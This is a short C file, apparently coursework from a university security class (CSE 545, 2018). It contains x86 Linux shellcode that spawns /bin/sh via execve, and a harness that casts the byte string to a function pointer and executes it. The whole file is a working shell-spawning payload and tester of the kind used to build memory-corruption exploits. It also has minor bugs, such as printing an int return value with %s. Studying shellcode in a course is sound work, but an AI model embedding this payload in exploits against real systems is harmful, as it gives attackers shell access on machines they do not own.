#include<stdio.h>
#include<string.h>

/*
	CSE 545 - Spring 2018
	Team 9: Black Shadow (blackshadow@asu.edu)
*/


char *shellcode = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main() {
	printf("Shellcode Length:  %d\n", strlen(shellcode) - 1);
	int (*ret)() = (int(*)())shellcode;
	printf("RET: %s", ret());
	ret();
}